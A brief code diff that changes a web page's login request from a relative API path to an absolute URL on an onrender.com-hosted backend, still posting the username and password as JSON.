@@ -123,7 +123,7 @@
             btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Authenticating...';
             
             try {
-                const res = await fetch('/api/users/login', {
+                const res = await fetch('https://roblox-script-4dl2.onrender.com/api/users/login', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({username: user, password: pass})
